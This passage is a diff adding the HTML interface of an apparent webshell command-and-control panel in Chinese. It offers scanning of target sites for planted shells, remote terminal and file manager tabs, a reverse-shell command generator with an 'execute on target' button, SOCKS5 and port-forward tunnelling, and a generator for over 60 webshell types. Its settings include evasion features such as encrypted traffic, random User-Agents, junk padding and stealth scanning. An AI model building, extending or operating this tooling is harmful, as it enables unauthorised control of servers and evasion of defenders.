@@ -1,0 +1,2430 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TMbox - Webshell 管理面板 v2.0</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/webshell/crypto.js"></script>
+    <script src="/webshell/protocol.js"></script>
+    <script src="/webshell/terminal.js"></script>
+    <script src="/webshell/filemanager.js"></script>
+    <script src="/webshell/proxy.js"></script>
+    <script src="/webshell/reverse.js"></script>
+    <script src="/webshell/core.js"></script>
+    <style>
+        body { background-color: #0f172a; color: #e2e8f0; }
+        .terminal-font { font-family: 'Consolas', 'Courier New', monospace; }
+        .neon-pink { box-shadow: 0 0 10px #ec4899; }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #1e293b; }
+        ::-webkit-scrollbar-thumb { background: #475569; border-radius: 3px; }
+        .shell-card:hover { border-color: #ec4899; }
+        .terminal-output { white-space: pre-wrap; word-break: break-all; }
+        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
+        .cursor-blink { animation: blink 1s infinite; }
+        @keyframes pulse-green { 0%, 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.4); } 50% { box-shadow: 0 0 0 8px rgba(34, 197, 94, 0); } }
+        .crypto-active { animation: pulse-green 2s infinite; }
+        .crypto-badge { font-size: 9px; padding: 1px 4px; border-radius: 3px; }
+    </style>
+</head>
+<body class="h-screen flex flex-col overflow-hidden">
+
+    <!-- 顶部导航 -->
+    <header class="bg-slate-900 border-b border-pink-900/50 p-2 flex justify-between items-center shadow-lg z-10 shrink-0">
+        <div class="flex items-center gap-3">
+            <div class="w-3 h-3 rounded-full bg-pink-500 animate-pulse"></div>
+            <h1 class="text-lg font-bold text-pink-500 tracking-wider">WEBSHELL <span class="text-slate-400">MANAGER v2.0</span></h1>
+            <span id="shellStatus" class="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-500">未连接</span>
+            <span id="cryptoStatus" class="crypto-badge bg-slate-800 text-slate-500 hidden">
+                <span id="cryptoIcon">🔓</span> <span id="cryptoText">未加密</span>
+            </span>
+        </div>
+        <div class="flex gap-2 items-center">
+            <button onclick="showImportModal()" class="text-xs bg-slate-700 hover:bg-slate-600 text-slate-300 px-3 py-1.5 rounded transition">
+                导入
+            </button>
+            <button onclick="exportShells()" class="text-xs bg-slate-700 hover:bg-slate-600 text-slate-300 px-3 py-1.5 rounded transition">
+                导出
+            </button>
+            <button onclick="showAddShellModal()" class="text-xs bg-pink-600 hover:bg-pink-700 text-white px-3 py-1.5 rounded transition">
+                + 添加 Shell
+            </button>
+            <button onclick="showGenerateShellModal()" class="text-xs bg-purple-600 hover:bg-purple-700 text-white px-3 py-1.5 rounded transition">
+                生成木马
+            </button>
+            <button onclick="window.location.href='/'" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded border border-slate-700 transition">
+                ← 返回主页
+            </button>
+        </div>
+    </header>
+
+    <!-- 主要内容 -->
+    <div class="flex flex-1 overflow-hidden">
+
+        <!-- 左侧：Shell 列表 -->
+        <div class="w-64 bg-slate-800 border-r border-slate-700 flex flex-col overflow-hidden shrink-0">
+            <div class="p-2 border-b border-slate-700 flex justify-between items-center">
+                <h3 class="text-xs font-bold text-slate-400">Shell 列表</h3>
+                <span id="shellCount" class="text-[10px] text-slate-500">0 个</span>
+            </div>
+            <div id="shellList" class="flex-1 overflow-y-auto p-2 space-y-2">
+                <div class="text-center text-slate-600 text-xs py-4">暂无 Shell</div>
+            </div>
+            <div class="p-2 border-t border-slate-700">
+                <button onclick="batchTestAll()" class="w-full text-xs bg-slate-700 hover:bg-slate-600 text-slate-300 py-1.5 rounded">
+                    批量测试连接
+                </button>
+            </div>
+        </div>
+
+        <!-- 中间：功能区域 -->
+        <div class="flex-1 flex flex-col overflow-hidden">
+
+            <!-- Tab 导航 -->
+            <div class="flex bg-slate-900 border-b border-slate-700 text-xs">
+                <button onclick="switchTab('scanner')" id="tab-scanner" class="px-4 py-2 font-bold text-pink-400 bg-slate-800 border-b-2 border-pink-500">🔍 扫描</button>
+                <button onclick="switchTab('terminal')" id="tab-terminal" class="px-4 py-2 font-bold text-slate-400 hover:text-white">终端</button>
+                <button onclick="switchTab('files')" id="tab-files" class="px-4 py-2 font-bold text-slate-400 hover:text-white">文件管理</button>
+                <button onclick="switchTab('reverse')" id="tab-reverse" class="px-4 py-2 font-bold text-slate-400 hover:text-white">反弹Shell</button>
+                <button onclick="switchTab('proxy')" id="tab-proxy" class="px-4 py-2 font-bold text-slate-400 hover:text-white">代理</button>
+                <button onclick="switchTab('info')" id="tab-info" class="px-4 py-2 font-bold text-slate-400 hover:text-white">信息</button>
+                <button onclick="switchTab('config')" id="tab-config" class="px-4 py-2 font-bold text-slate-400 hover:text-white">配置</button>
+            </div>
+
+            <!-- 会话信息栏 -->
+            <div id="sessionInfoBar" class="bg-slate-800/50 border-b border-slate-700 px-3 py-1 text-[10px] flex items-center gap-4 hidden">
+                <span class="text-slate-500">Session: <span id="sessionId" class="text-cyan-400 font-mono">-</span></span>
+                <span class="text-slate-500">Seq: <span id="sequenceNum" class="text-green-400 font-mono">0</span></span>
+                <span class="text-slate-500">加密: <span id="encryptionType" class="text-yellow-400">AES-256-CBC</span></span>
+                <span class="text-slate-500">UA: <span id="currentUA" class="text-purple-400 truncate max-w-[200px]">Random</span></span>
+            </div>
+
+            <!-- Tab 内容 -->
+            <div class="flex-1 overflow-hidden relative">
+
+                <!-- 扫描 Tab -->
+                <div id="panel-scanner" class="absolute inset-0 flex flex-col bg-slate-900">
+                    <!-- 扫描配置 -->
+                    <div class="p-3 bg-slate-800 border-b border-slate-700">
+                        <h3 class="text-sm font-bold text-pink-400 mb-2">🔍 Webshell 自动扫描器</h3>
+
+                        <div class="grid grid-cols-4 gap-2 mb-3">
+                            <div class="col-span-2">
+                                <label class="block text-[10px] text-slate-500 mb-1">目标网址</label>
+                                <input type="text" id="scanTargetUrl" placeholder="http://target.com"
+                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
+                            </div>
+                            <div>
+                                <label class="block text-[10px] text-slate-500 mb-1">扫描模式</label>
+                                <select id="scanMode" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5">
+                                    <option value="quick">快速扫描</option>
+                                    <option value="deep">深度扫描</option>
+                                    <option value="stealth">隐蔽扫描</option>
+                                </select>
+                            </div>
+                            <div class="flex items-end gap-1">
+                                <button onclick="startAutoScan()" id="startScanBtn" class="flex-1 bg-pink-600 hover:bg-pink-700 text-white text-xs py-1.5 rounded">开始扫描</button>
+                                <button onclick="stopAutoScan()" id="stopScanBtn" class="flex-1 bg-red-600 hover:bg-red-700 text-white text-xs py-1.5 rounded hidden">停止</button>
+                            </div>
+                        </div>
+
+                        <!-- 扫描选项 -->
+                        <div class="grid grid-cols-5 gap-2 text-[10px]">
+                            <label class="flex items-center gap-1 text-slate-400">
+                                <input type="checkbox" id="scanCommonPaths" checked class="rounded"> 常见路径
+                            </label>
+                            <label class="flex items-center gap-1 text-slate-400">
+                                <input type="checkbox" id="scanBackup" checked class="rounded"> 备份文件
+                            </label>
+                            <label class="flex items-center gap-1 text-slate-400">
+                                <input type="checkbox" id="scanUpload" checked class="rounded"> 上传点
+                            </label>
+                            <label class="flex items-center gap-1 text-slate-400">
+                                <input type="checkbox" id="scanNuclei" class="rounded"> Nuclei
+                            </label>
+                            <label class="flex items-center gap-1 text-slate-400">
+                                <input type="checkbox" id="scanFuzz" class="rounded"> 目录爆破
+                            </label>
+                        </div>
+                    </div>
+
+                    <!-- 扫描结果 -->
+                    <div class="flex-1 overflow-y-auto p-3">
+                        <div class="grid grid-cols-2 gap-3">
+                            <!-- 扫描日志 -->
+                            <div>
+                                <div class="flex justify-between items-center mb-2">
+                                    <h4 class="text-xs font-bold text-slate-400">扫描日志</h4>
+                                    <span id="scanProgress" class="text-[10px] text-slate-500">就绪</span>
+                                </div>
+                                <div id="scanLogs" class="bg-slate-800 rounded p-2 h-64 overflow-y-auto font-mono text-xs space-y-1">
+                                    <div class="text-slate-600">等待开始扫描...</div>
+                                </div>
+                            </div>
+
+                            <!-- 发现的Webshell -->
+                            <div>
+                                <div class="flex justify-between items-center mb-2">
+                                    <h4 class="text-xs font-bold text-green-400">发现的 Webshell</h4>
+                                    <span id="foundShellCount" class="text-[10px] text-slate-500">0 个</span>
+                                </div>
+                                <div id="foundShells" class="bg-slate-800 rounded p-2 h-64 overflow-y-auto space-y-2">
+                                    <div class="text-slate-600 text-xs text-center py-8">暂无发现</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- 快速操作 -->
+                        <div class="mt-3 grid grid-cols-4 gap-2">
+                            <button onclick="scanCommonWebshells()" class="bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs py-2 rounded">
+                                📁 扫描常见路径
+                            </button>
+                            <button onclick="scanWithNuclei()" class="bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs py-2 rounded">
+                                🔬 Nuclei POC
+                            </button>
+                            <button onclick="fuzzDirectories()" class="bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs py-2 rounded">
+                                📂 目录爆破
+                            </button>
+                            <button onclick="testConnection()" class="bg-green-700 hover:bg-green-600 text-white text-xs py-2 rounded">
+                                🔗 测试连接
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- 发现后快速连接 -->
+                    <div id="quickConnectPanel" class="hidden p-3 bg-slate-800 border-t border-pink-500">
+                        <h4 class="text-xs font-bold text-pink-400 mb-2">快速连接</h4>
+                        <div class="grid grid-cols-5 gap-2">
+                            <div class="col-span-2">
+                                <input type="text" id="quickConnectUrl" placeholder="http://target.com/shell.php"
+                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
+                            </div>
+                            <div>
+                                <input type="text" id="quickConnectPassword" placeholder="密码"
+                                       class="w-full bg-slate-900 text-yellow-400 border border-slate-600 rounded p-1.5 text-xs">
+                            </div>
+                            <div>
+                                <select id="quickConnectType" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5">
+                                    <option value="auto">自动检测</option>
+                                    <option value="php_eval">PHP Eval</option>
+                                    <option value="behinder_php">冰蝎 PHP</option>
+                                    <option value="antsword_php">蚁剑 PHP</option>
+                                </select>
+                            </div>
+                            <button onclick="quickConnect()" class="bg-pink-600 hover:bg-pink-700 text-white text-xs py-1.5 rounded">
+                                连接
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 终端 Tab -->
+                <div id="panel-terminal" class="absolute inset-0 flex flex-col bg-black">
+                    <div id="terminalOutput" class="flex-1 overflow-y-auto p-3 terminal-font text-xs text-green-400 terminal-output"></div>
+                    <div class="p-2 bg-slate-900 border-t border-slate-800 flex items-center gap-2">
+                        <span id="terminalPrompt" class="text-pink-400 font-bold text-xs">$</span>
+                        <input type="text" id="terminalInput"
+                               class="bg-transparent border-none outline-none flex-1 text-slate-200 text-xs font-mono"
+                               placeholder="输入命令..." autocomplete="off">
+                        <button onclick="executeTerminalCommand()" class="text-xs bg-pink-600 hover:bg-pink-700 text-white px-3 py-1 rounded">执行</button>
+                    </div>
+                </div>
+
+                <!-- 文件管理 Tab -->
+                <div id="panel-files" class="absolute inset-0 flex flex-col bg-slate-900 hidden">
+                    <div class="p-2 bg-slate-800 border-b border-slate-700 flex items-center gap-2">
+                        <button onclick="goToParentDir()" class="text-xs bg-slate-700 hover:bg-slate-600 px-2 py-1 rounded">↑ 上级</button>
+                        <input type="text" id="currentPath" value="/"
+                               class="flex-1 bg-slate-900 text-green-400 border border-slate-600 rounded px-2 py-1 text-xs font-mono">
+                        <button onclick="refreshFileList()" class="text-xs bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded">刷新</button>
+                        <button onclick="showUploadModal()" class="text-xs bg-green-600 hover:bg-green-700 px-2 py-1 rounded">上传</button>
+                        <button onclick="showMkdirModal()" class="text-xs bg-purple-600 hover:bg-purple-700 px-2 py-1 rounded">新建目录</button>
+                    </div>
+                    <div id="fileList" class="flex-1 overflow-y-auto p-2">
+                        <table class="w-full text-xs">
+                            <thead class="bg-slate-800 sticky top-0">
+                                <tr class="text-slate-500">
+                                    <th class="p-2 text-left">名称</th>
+                                    <th class="p-2 text-right w-20">大小</th>
+                                    <th class="p-2 text-right w-32">修改时间</th>
+                                    <th class="p-2 text-right w-16">权限</th>
+                                    <th class="p-2 text-center w-28">操作</th>
+                                </tr>
+                            </thead>
+                            <tbody id="fileTableBody" class="text-slate-300">
+                                <tr><td colspan="5" class="p-4 text-center text-slate-600">请先连接 Shell</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- 反弹Shell Tab -->
+                <div id="panel-reverse" class="absolute inset-0 flex flex-col bg-slate-900 hidden">
+                    <div class="p-3 bg-slate-800 border-b border-slate-700">
+                        <h3 class="text-sm font-bold text-pink-400 mb-2">生成反弹Shell命令</h3>
+                        <div class="grid grid-cols-4 gap-2 mb-3">
+                            <div>
+                                <label class="block text-[10px] text-slate-500 mb-1">类型</label>
+                                <select id="reverseType" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5">
+                                    <option value="bash">Bash TCP</option>
+                                    <option value="bash_exec">Bash Exec</option>
+                                    <option value="nc">Netcat</option>
+                                    <option value="nc_fifo">Netcat FIFO</option>
+                                    <option value="perl">Perl</option>
+                                    <option value="python">Python 2</option>
+                                    <option value="python3">Python 3</option>
+                                    <option value="php">PHP</option>
+                                    <option value="php_shell">PHP Shell</option>
+                                    <option value="ruby">Ruby</option>
+                                    <option value="java">Java</option>
+                                    <option value="powershell">PowerShell</option>
+                                    <option value="socat">Socat</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-[10px] text-slate-500 mb-1">IP</label>
+                                <input type="text" id="reverseIp" placeholder="192.168.1.100"
+                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
+                            </div>
+                            <div>
+                                <label class="block text-[10px] text-slate-500 mb-1">端口</label>
+                                <input type="text" id="reversePort" value="4444"
+                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
+                            </div>
+                            <div class="flex items-end">
+                                <button onclick="generateReverseShell()" class="w-full bg-pink-600 hover:bg-pink-700 text-white text-xs py-1.5 rounded">生成</button>
+                            </div>
+                        </div>
+                        <div class="bg-slate-900 rounded p-2">
+                            <div class="flex justify-between items-center mb-1">
+                                <span class="text-[10px] text-slate-500">命令:</span>
+                                <button onclick="copyReverseCommand()" class="text-[10px] text-blue-400 hover:text-blue-300">复制</button>
+                            </div>
+                            <code id="reverseCommand" class="text-xs text-green-400 block break-all">选择类型并输入 IP/端口生成命令</code>
+                        </div>
+                        <div class="mt-2 flex gap-2">
+                            <button onclick="executeReverseShell()" class="text-xs bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded">在目标执行</button>
+                            <button onclick="copyListenerCommand()" class="text-xs bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded">复制监听命令</button>
+                        </div>
+                    </div>
+                    <div class="flex-1 overflow-y-auto p-3">
+                        <h4 class="text-xs font-bold text-slate-400 mb-2">反弹Shell历史</h4>
+                        <div id="reverseHistory" class="space-y-2">
+                            <div class="text-slate-600 text-xs text-center py-4">暂无记录</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 代理 Tab -->
+                <div id="panel-proxy" class="absolute inset-0 flex flex-col bg-slate-900 hidden">
+                    <div class="p-3 bg-slate-800 border-b border-slate-700">
+                        <h3 class="text-sm font-bold text-cyan-400 mb-2">🔌 TCP 代理隧道</h3>
+
+                        <!-- 代理类型选择 -->
+                        <div class="flex gap-2 mb-3">
+                            <button onclick="setProxyMode('forward')" id="proxyModeForward" class="proxy-mode-btn text-[10px] px-3 py-1 rounded bg-cyan-600 text-white">端口转发</button>
+                            <button onclick="setProxyMode('socks5')" id="proxyModeSocks5" class="proxy-mode-btn text-[10px] px-3 py-1 rounded bg-slate-700 text-slate-300">SOCKS5</button>
+                            <button onclick="setProxyMode('http')" id="proxyModeHttp" class="proxy-mode-btn text-[10px] px-3 py-1 rounded bg-slate-700 text-slate-300">HTTP代理</button>
+                            <button onclick="setProxyMode('single')" id="proxyModeSingle" class="proxy-mode-btn text-[10px] px-3 py-1 rounded bg-slate-700 text-slate-300">单次请求</button>
+                        </div>
+
+                        <!-- 端口转发配置 -->
+                        <div id="proxyForwardConfig" class="grid grid-cols-5 gap-2">
+                            <div>
+                                <label class="block text-[10px] text-slate-500 mb-1">本地监听端口</label>
+                                <input type="text" id="proxyLocalPort" value="1080"
+                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
+                            </div>
+                            <div>
+                                <label class="block text-[10px] text-slate-500 mb-1">目标主机</label>
+                                <input type="text" id="proxyTargetHost" placeholder="127.0.0.1"
+                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
+                            </div>
+                            <div>
+                                <label class="block text-[10px] text-slate-500 mb-1">目标端口</label>
+                                <input type="text" id="proxyTargetPort" placeholder="3306"
+                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
+                            </div>
+                            <div class="flex items-end">
+                                <button onclick="startProxyForward()" id="startProxyBtn" class="w-full bg-cyan-600 hover:bg-cyan-700 text-white text-xs py-1.5 rounded">启动</button>
+                            </div>
+                            <div class="flex items-end">
+                                <button onclick="stopProxyAction()" id="stopProxyBtn" class="w-full bg-red-600 hover:bg-red-700 text-white text-xs py-1.5 rounded hidden">停止</button>
+                            </div>
+                        </div>
+
+                        <!-- 单次请求配置 -->
+                        <div id="proxySingleConfig" class="hidden space-y-2">
+                            <div class="grid grid-cols-4 gap-2">
+                                <div>
+                                    <label class="block text-[10px] text-slate-500 mb-1">目标主机</label>
+                                    <input type="text" id="singleProxyHost" placeholder="127.0.0.1"
+                                           class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
+                                </div>
+                                <div>
+                                    <label class="block text-[10px] text-slate-500 mb-1">目标端口</label>
+                                    <input type="text" id="singleProxyPort" placeholder="80"
+                                           class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
+                                </div>
+                                <div class="col-span-2 flex items-end">
+                                    <button onclick="sendSingleProxyRequest()" class="w-full bg-cyan-600 hover:bg-cyan-700 text-white text-xs py-1.5 rounded">发送请求</button>
+                                </div>
+                            </div>
+                            <div>
+                                <label class="block text-[10px] text-slate-500 mb-1">请求数据</label>
+                                <textarea id="singleProxyData" rows="2" placeholder="GET / HTTP/1.1&#10;Host: localhost"
+                                          class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-2 text-xs font-mono"></textarea>
+                            </div>
+                        </div>
+
+                        <!-- 状态显示 -->
+                        <div id="proxyStatus" class="mt-2 text-[10px] text-slate-500 hidden">
+                            <span class="text-green-400">● 运行中</span> |
+                            连接: <span id="proxyConnections">0</span> |
+                            入站: <span id="proxyBytesIn">0 B</span> |
+                            出站: <span id="proxyBytesOut">0 B</span>
+                        </div>
+                    </div>
+
+                    <!-- 代理日志和响应 -->
+                    <div class="flex-1 overflow-y-auto p-3">
+                        <div class="flex justify-between items-center mb-2">
+                            <h4 class="text-xs font-bold text-slate-400">代理日志</h4>
+                            <button onclick="clearProxyLogs()" class="text-[10px] text-slate-500 hover:text-slate-300">清空</button>
+                        </div>
+                        <div id="proxyLogs" class="space-y-1 font-mono text-xs mb-4">
+                            <div class="text-slate-600 text-center py-2">暂无日志</div>
+                        </div>
+                        <div id="proxyResponseArea" class="hidden">
+                            <h4 class="text-xs font-bold text-slate-400 mb-2">响应</h4>
+                            <pre id="proxyResponse" class="bg-slate-800 rounded p-2 text-xs text-green-400 overflow-x-auto max-h-64"></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 信息 Tab -->
+                <div id="panel-info" class="absolute inset-0 flex flex-col bg-slate-900 hidden">
+                    <div class="p-3 bg-slate-800 border-b border-slate-700 flex justify-between items-center">
+                        <h3 class="text-sm font-bold text-yellow-400">系统信息</h3>
+                        <div class="flex gap-2">
+                            <button onclick="refreshSystemInfo()" class="text-xs bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded">刷新</button>
+                            <button onclick="downloadPhpInfo()" class="text-xs bg-purple-600 hover:bg-purple-700 text-white px-3 py-1 rounded">phpinfo</button>
+                        </div>
+                    </div>
+                    <div class="flex-1 overflow-y-auto p-3">
+                        <div id="systemInfo" class="space-y-2">
+                            <div class="text-slate-600 text-xs text-center py-8">请先连接 Shell</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 配置 Tab -->
+                <div id="panel-config" class="absolute inset-0 flex flex-col bg-slate-900 hidden">
+                    <div class="p-3 bg-slate-800 border-b border-slate-700">
+                        <h3 class="text-sm font-bold text-blue-400">Webshell 配置</h3>
+                    </div>
+                    <div class="flex-1 overflow-y-auto p-3">
+                        <div class="max-w-lg mx-auto space-y-4">
+                            <!-- 加密设置 -->
+                            <div class="bg-slate-800 rounded p-3">
+                                <h4 class="text-xs font-bold text-pink-400 mb-3 flex items-center gap-2">
+                                    🔐 加密设置
+                                </h4>
+                                <div class="space-y-3">
+                                    <div class="flex items-center gap-2">
+                                        <input type="checkbox" id="configEncryption" checked class="rounded">
+                                        <label class="text-xs text-slate-400">启用 AES-256-CBC 加密</label>
+                                    </div>
+                                    <div class="flex items-center gap-2">
+                                        <input type="checkbox" id="configSign" class="rounded">
+                                        <label class="text-xs text-slate-400">启用签名 (防重放攻击)</label>
+                                    </div>
+                                    <div class="flex items-center gap-2">
+                                        <input type="checkbox" id="configPadding" class="rounded">
+                                        <label class="text-xs text-slate-400">HTTP 填充垃圾数据</label>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- 编码设置 -->
+                            <div class="bg-slate-800 rounded p-3">
+                                <h4 class="text-xs font-bold text-cyan-400 mb-3">📝 编码设置</h4>
+                                <div class="space-y-3">
+                                    <div>
+                                        <label class="block text-xs text-slate-400 mb-1">编码</label>
+                                        <select id="configEncoding" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-2">
+                                            <option value="UTF-8">UTF-8</option>
+                                            <option value="GBK">GBK</option>
+                                            <option value="GB2312">GB2312</option>
+                                        </select>
+                                    </div>
+                                    <div>
+                                        <label class="block text-xs text-slate-400 mb-1">编码器</label>
+                                        <select id="configEncoder" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-2">
+                                            <option value="none">无</option>
+                                            <option value="base64">Base64</option>
+                                            <option value="hex">Hex</option>
+                                            <option value="xor">XOR</option>
+                                        </select>
+                                    </div>
+                                    <div>
+                                        <label class="block text-xs text-slate-400 mb-1">解码器</label>
+                                        <select id="configDecoder" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-2">
+                                            <option value="none">无</option>
+                                            <option value="base64">Base64</option>
+                                            <option value="hex">Hex</option>
+                                            <option value="auto">自动检测</option>
+                                        </select>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- 网络设置 -->
+                            <div class="bg-slate-800 rounded p-3">
+                                <h4 class="text-xs font-bold text-green-400 mb-3">🌐 网络设置</h4>
+                                <div class="space-y-3">
+                                    <div class="flex items-center gap-2">
+                                        <input type="checkbox" id="configRandomUA" checked class="rounded">
+                                        <label class="text-xs text-slate-400">随机 User-Agent</label>
+                                    </div>
+                                    <div>
+                                        <label class="block text-xs text-slate-400 mb-1">超时时间 (ms)</label>
+                                        <input type="number" id="configTimeout" value="30000"
+                                               class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-2">
+                                    </div>
+                                </div>
+                            </div>
+
+                            <button onclick="saveConfig()" class="w-full bg-blue-600 hover:bg-blue-700 text-white text-xs py-2 rounded">保存配置</button>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <!-- 添加 Shell 模态框 -->
+    <div id="addShellModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50 hidden">
+        <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 w-[450px]">
+            <div class="p-3 border-b border-slate-700 flex justify-between items-center">
+                <h3 class="text-sm font-bold text-pink-400">添加 Webshell</h3>
+                <button onclick="hideAddShellModal()" class="text-slate-500 hover:text-white">&times;</button>
+            </div>
+            <div class="p-3 space-y-3">
+                <div>
+                    <label class="block text-xs text-slate-400 mb-1">名称</label>
+                    <input type="text" id="shellName" placeholder="我的 Shell"
+                           class="w-full bg-slate-900 text-slate-200 border border-slate-600 rounded p-2 text-xs">
+                </div>
+                <div>
+                    <label class="block text-xs text-slate-400 mb-1">URL</label>
+                    <input type="text" id="shellUrl" placeholder="http://target.com/shell.php"
+                           class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-2 text-xs">
+                </div>
+                <div>
+                    <label class="block text-xs text-slate-400 mb-1">密码</label>
+                    <input type="text" id="shellPassword" placeholder="cmd"
+                           class="w-full bg-slate-900 text-yellow-400 border border-slate-600 rounded p-2 text-xs">
+                </div>
+                <div>
+                    <label class="block text-xs text-slate-400 mb-1">类型</label>
+                    <select id="shellType" class="w-full bg-slate-900 text-slate-200 border border-slate-600 rounded p-2 text-xs">
+                        <optgroup label="🟢 PHP 8.x (推荐)">
+                            <option value="php8_eval">PHP8 Eval (推荐)</option>
+                            <option value="php8_system">PHP8 System</option>
+                            <option value="php8_passthru">PHP8 Passthru</option>
+                            <option value="php8_shell_exec">PHP8 Shell_Exec</option>
+                            <option value="php8_proc_open">PHP8 Proc_Open</option>
+                        </optgroup>
+                        <optgroup label="🟡 PHP 7.x">
+                            <option value="php7_assert">PHP7 Assert</option>
+                            <option value="php7_create_function">PHP7 Create_Function</option>
+                        </optgroup>
+                        <optgroup label="🔵 PHP 通用">
+                            <option value="php_base64">PHP Base64编码</option>
+                            <option value="php_concat">PHP 字符串拼接</option>
+                            <option value="php_callback_array">PHP array_map</option>
+                            <option value="php_class_invoke">PHP __invoke</option>
+                        </optgroup>
+                        <optgroup label="冰蝎 (需对应生成器)">
+                            <option value="behinder_php">冰蝎 PHP</option>
+                            <option value="behinder_php_enhanced">冰蝎 PHP 增强版</option>
+                            <option value="behinder_jsp">冰蝎 JSP</option>
+                            <option value="behinder_jsp_enhanced">冰蝎 JSP 增强版</option>
+                            <option value="behinder_aspx">冰蝎 ASPX</option>
+                        </optgroup>
+                        <optgroup label="蚁剑">
+                            <option value="antsword_php">蚁剑 PHP</option>
+                        </optgroup>
+                        <optgroup label="ASP/ASPX">
+                            <option value="asp_simple">ASP 一句话</option>
+                            <option value="asp_encode">ASP 编码执行</option>
+                            <option value="aspx_jscript">ASPX JScript</option>
+                            <option value="aspx_csharp">ASPX C#</option>
+                        </optgroup>
+                        <optgroup label="JSP">
+                            <option value="jsp_runtime">JSP Runtime</option>
+                            <option value="jsp_processbuilder">JSP ProcessBuilder</option>
+                        </optgroup>
+                    </select>
+                </div>
+                <!-- 加密选项 -->
+                <div class="bg-slate-900 rounded p-2 space-y-2">
+                    <div class="flex items-center gap-2">
+                        <input type="checkbox" id="shellEncryption" checked class="rounded">
+                        <label class="text-xs text-slate-400">启用 AES-256-CBC 加密</label>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <input type="checkbox" id="shellSign" class="rounded">
+                        <label class="text-xs text-slate-400">启用签名防重放</label>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <input type="checkbox" id="shellPadding" class="rounded">
+                        <label class="text-xs text-slate-400">HTTP 垃圾填充</label>
+                    </div>
+                </div>
+            </div>
+            <div class="p-3 border-t border-slate-700 flex gap-2">
+                <button onclick="hideAddShellModal()" class="flex-1 bg-slate-700 hover:bg-slate-600 text-white text-xs py-2 rounded">取消</button>
+                <button onclick="addNewShell()" class="flex-1 bg-pink-600 hover:bg-pink-700 text-white text-xs py-2 rounded">添加并测试</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 生成木马模态框 -->
+    <div id="generateShellModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50 hidden">
+        <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 w-[700px] max-h-[90vh] flex flex-col">
+            <div class="p-3 border-b border-slate-700 flex justify-between items-center shrink-0">
+                <h3 class="text-sm font-bold text-purple-400">🧬 Webshell 生成器 <span class="text-slate-500 text-xs">60+ 种类型</span></h3>
+                <button onclick="hideGenerateShellModal()" class="text-slate-500 hover:text-white">&times;</button>
+            </div>
+            <div class="p-3 space-y-3 overflow-y-auto flex-1">
+                <!-- 分类过滤 -->
+                <div class="flex gap-2 flex-wrap">
+                    <button onclick="filterShellCategory('all')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-purple-600 text-white" data-cat="all">全部</button>
+                    <button onclick="filterShellCategory('PHP 8.x')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="PHP 8.x">PHP 8.x</button>
+                    <button onclick="filterShellCategory('PHP 7.x')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="PHP 7.x">PHP 7.x</button>
+                    <button onclick="filterShellCategory('PHP 通用')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="PHP 通用">PHP 通用</button>
+                    <button onclick="filterShellCategory('ASP')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="ASP">ASP</button>
